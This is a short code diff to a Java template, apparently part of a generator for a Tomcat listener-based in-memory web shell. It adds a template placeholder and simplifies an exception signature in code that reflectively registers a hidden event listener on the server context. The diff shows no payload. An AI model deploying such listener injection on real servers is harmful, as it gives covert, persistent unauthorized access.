@@ -7,6 +7,7 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
 {common}
 {decoder}
 {stub}
+{context}
     private void hook(Object servletRequestEvent) throws Exception {{
         Object servletRequest = invokeMethod(
             servletRequestEvent, "getServletRequest"
@@ -29,8 +30,7 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
         return null;
     }}
 
-    private void addListener(Object proxyObject)
-            throws InvocationTargetException, IllegalAccessException {{
+    private void addListener(Object proxyObject) throws Exception {{
         Object context = getStandardContext();
         getMethodX(context.getClass(), "addApplicationEventListener", 1)
             .invoke(context, proxyObject);
